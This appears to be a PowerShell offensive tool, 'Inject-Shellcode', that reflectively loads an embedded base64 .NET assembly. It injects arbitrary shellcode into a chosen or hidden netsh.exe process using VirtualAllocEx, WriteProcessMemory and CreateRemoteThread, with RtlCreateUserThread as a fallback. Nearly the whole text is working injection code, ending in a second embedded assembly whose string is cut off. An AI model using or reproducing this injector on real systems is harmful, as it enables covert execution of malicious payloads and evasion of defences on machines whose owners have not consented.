function Inject-Shellcode ([switch]$x86, [switch]$x64, [switch]$Force, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath, $ProcessName)
{
<#
.SYNOPSIS
Inject-Shellcode

Author: @benpturner
 
.DESCRIPTION
Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte)

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessPath C:\Windows\System32\notepad.exe

.EXAMPLE
Inject-Shellcode -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessName notepad.exe

#>

$p = "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CQBAAFoACQBEAF8ACQBIAGQACQBMAGkACQBQADIACQBUAG4ACQBYAHMACQBcAHgACQBgAH0ACABoAGQACABsAGkACABwAG4ACAB0AFAACAB4AFUACAB8AFoACACAAF8ACACEAHMACACIAHgALgALAPYALgATAP8ALgAbAB4BLgAjACcBLgArADMBLgAzADMBLgA7ADMBLgBDACcBLgBLADkBLgBTADMBLgBbADMBLgBjAFEBLgBrAHsBYwBzAGQAgwBzAGQAowBzAGQAMQCCACgEAQA1BAABAwD2BQEAAAEFAKMBAQAAAQcAEwYBAAABCQAFBgEAAAELAIAFAQAAAQ0AjAUBAAABDwD9AQEAAAERAL4BAQAAARMAiAEBAAABFQCWAQEABgEXAO0BAQBDARkAngUCAAABGwDJAQMABIAAAAEAAAAAAAAAAAAAAAAA5QUAAAIAAAAAAAAAAAAAABoAVAEAAAAAAwACAAQAAgAFAAIAAAAAAABrZXJuZWwzMgA8TW9kdWxlPgBFWEVDVVRFX1JFQUQAU1VTUEVORF9SRVNVTUUAVEVSTUlOQVRFAElNUEVSU09OQVRFAFBBR0VfUkVBRFdSSVRFAEVYRUNVVEVfUkVBRFdSSVRFAEVYRUNVVEUATUVNX1JFU0VSVkUAV1JJVEVfV0FUQ0gAUEhZU0lDQUwAU0VUX1RIUkVBRF9UT0tFTgBTRVRfSU5GT1JNQVRJT04AUVVFUllfSU5GT1JNQVRJT04ARElSRUNUX0lNUEVSU09OQVRJT04AVE9QX0RPV04ATEFSR0VfUEFHRVMATk9BQ0NFU1MAUFJPQ0VTU19BTExfQUNDRVNTAFJFU0VUAE1FTV9DT01NSVQAR0VUX0NPTlRFWFQAU0VUX0NPTlRFWFQAUkVBRE9OTFkARVhFQ1VURV9XUklURUNPUFkAdmFsdWVfXwBtc2NvcmxpYgBscFRocmVhZElkAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAQ2xpZW50SWQAU3VzcGVuZFRocmVhZABSZXN1bWVUaHJlYWQAQ3JlYXRlUmVtb3RlVGhyZWFkAGhUaHJlYWQAT3BlblRocmVhZABSdGxDcmVhdGVVc2VyVGhyZWFkAENyZWF0ZVN1c3BlbmRlZABHZXRNb2R1bGVIYW5kbGUAQ2xvc2VIYW5kbGUAYkluaGVyaXRIYW5kbGUAaE1vZHVsZQBwcm9jTmFtZQBscE1vZHVsZU5hbWUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAENvbW1pdHRlZFN0YWNrU2l6ZQBNYXhpbXVtU3RhY2tTaXplAGR3U3RhY2tTaXplAG5TaXplAGR3U2l6ZQBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNIRV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBMZW5ndGgAa2VybmVsMzIuZGxsAG50ZGxsLmRsbABJbmplY3QuZGxsAEZpbGwAU3lzdGVtAEVudW0AbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbgBwRGVzdGluYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscEJ1ZmZlcgBscFBhcmFtZXRlcgAuY3RvcgBUaHJlYWRTZWN1cml0eURlc2NyaXB0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAVGhyZWFkQWNjZXNzAGR3RGVzaXJlZEFjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBHZXRD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bgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA0D8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$dl  = [System.Convert]::FromBase64String($p)
$a = [System.Reflection.Assembly]::Load($dl)
$o = New-Object Inject
$pst = New-Object System.Diagnostics.ProcessStartInfo
$pst.UseShellExecute = $False
$pst.CreateNoWindow = $True
$pst.FileName = "C:\Windows\system32\netsh.exe"
echo ""
echo "[+] Inject-Shellcode"
if ($x86.IsPresent) {
    if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
        $pst.FileName = "C:\Windows\System32\netsh.exe"
    } else {
        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
    }
}
   
if ($ProcessPath) {
    $pst.FileName = "$ProcessPath"
    $Process = [System.Diagnostics.Process]::Start($pst)
} elseif ($ProcessName) {
    $Process = [System.Diagnostics.Process]::GetProcessesByName($ProcessName)
} elseif ($ProcID){
    $Process = [System.Diagnostics.Process]::GetProcessById($ProcID)
} else {
    $Process = [System.Diagnostics.Process]::Start($pst)
}

$ProcessX86 = IsProcess-x86 $Process.ID
$ProcessIDVal = $Process.ID
$Proceed = $false

if (($x86.IsPresent) -and ($ProcessX86)) {
    echo "[+] Running against x86 process with ID: $ProcessIDVal"
    $Proceed = $true
} elseif (($env:PROCESSOR_ARCHITECTURE -eq "x86") -and ($ProcessX86)) {
    echo "[+] Running against x86 process with ID: $ProcessIDVal"
    $Proceed = $true
} elseif ($ProcessX86) {
    echo "[-] x86 process identified, use -x86 or this could crash the process"
    echo "If you believe this is wrong use -Force to try injection anyway - use at own risk"
    $Proceed = $false
} else {
    echo "[+] Running against x64 process with ID: $ProcessIDVal"
    $Proceed = $true
}

$CurrentProcX86 = IsProcess-x86 $PID
if ($CurrentProcX86) {
    echo "[+] Current process arch is x86: $ProcessIDVal"
} else {
    echo "[+] Current process arch is x64: $ProcessIDVal"    
}
echo ""

if ($Proceed) {

try {
    [IntPtr]$phandle = [Inject]::OpenProcess([Inject]::PROCESS_ALL_ACCESS, $false, $Process.ID);
    [IntPtr]$zz = 0x10000
    [IntPtr]$x = 0
    [IntPtr]$nul = 0
    [IntPtr]$max = 0x70000000
    while( $zz.ToInt32() -lt $max.ToInt32() )
    {
        $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
        if( $x.ToInt32() -ne $nul.ToInt32() ){ 
        break 
        }
        $zz = [Int32]$zz + $Shellcode.Length
    }
    echo "VirtualAllocEx"
    echo "[+] $x"
    if( $x.ToInt32() -gt $nul.ToInt32() )
    {
    
        $hg = [Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
        [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $hg, $Shellcode.Length)
        $s = [Inject]::WriteProcessMemory($phandle,[IntPtr]($x.ToInt32()),$hg, $Shellcode.Length,0)
        echo "WriteProcessMemory"
        echo "[+] $s"
        $e = [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)

        echo "CreateRemoteThread"
        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[+] $e"  

        if ($e -eq 0) {
            $TokenHandle = [IntPtr]::Zero
            $c = [Inject]::RtlCreateUserThread($phandle,0,0,0,0,0,[IntPtr]$x,0,[ref] $TokenHandle,0)    
            echo "RtlCreateUserThread"
            $hexVal = "{0:x}" -f $c
            if ($hexVal -eq "c0000022") {
                echo "[-] Access Denied 0xC0000022"
            } else {
                echo "[+] Dec: $c"
                echo "[+] Hex: 0x$($hexVal)"        
            }
        } 

        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[-] LastError: $Lasterror"    
    } else {
        echo "[-] Failed using VirtualAllocEx"
        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[-] LastError: $Lasterror"  
        echo ""
    }
} catch {
    echo $Error[0]  
}

}
}

$psloadedprochandler = $null
Function IsProcess-x86 ($processID) {

if ($psloadedprochandler -ne "TRUE") {
    $script:psloadedprochandler = "TRUE"
    $ps = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDACx/YFoAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAJicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAANQmAABPAAAAAEAAAKgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACcJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAALAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAIJwAAAAAAAEgAAAACAAUAUCAAAEwFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMQBAAAjfgAAMAIAAEACAAAjU3RyaW5ncwAAAABwBAAABAAAACNVUwB0BAAAEAAAACNHVUlEAAAAhAQAAMgAAAAjQmxvYgAAAAAAAAACAAABRzUAFAkAAAAA+gEzABYAAAEAAAAPAAAAAgAAAAEAAAADAAAADQAAAA0AAAACAAAAAQAAAAEAAAABAAAAAQAAAAAAegEBAAAAAAAGAOIA7QEGAE8B7QEGAC8AuwEPAA0CAAAGAFcAlAEGAMUAlAEGAKYAlAEGADYBlAEGAAIBlAEGABsBlAEGAG4AlAEGAEMAzgEGACEAzgEGAIkAlAEGADgCjQEAAAAAAQAAAAAAAQABAIEBEACmAQAAPQABAAEAAAAAAIAAliAcAiUAAQAAIAAAAAABAAEAEwACIAIAKwIJALUBAQARALUBBgAZALUBCgApALUBEAAxALUBEAA5ALUBEABBALUBEABJALUBEABRALUBEABZALUBEABhALUBFQBpALUBEABxALUBEAAuAAsALAAuABMANQAuABsAVAAuACMAXQAuACsAcQAuADMAcQAuADsAcQAuAEMAXQAuAEsAdwAuAFMAcQAuAFsAcQAuAGMAjwAuAGsAuQADACMABwAjAG0BQAEDABwCAQAEgAAAAQAAAAAAAAAAAAAAAACmAQAAAgAAAAAAAAAAAAAAGgAKAAAAAAAAAAAAADxNb2R1bGU+AG1zY29ybGliAHByb2Nlc3NIYW5kbGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAUHJvY2Vzc0hhbmRsZXIuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBQcm9jZXNzSGFuZGxlcgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMASXNXb3c2NFByb2Nlc3MAd293NjRQcm9jZXNzAE9iamVjdAAAAAAAAMe7zDzTzepJlqlyZm7cVhgABCABAQgDIAABBSABARERBCABAQ4EIAEBAgi3elxWGTTgiQECBgACAhgQAggBAAgAAAAA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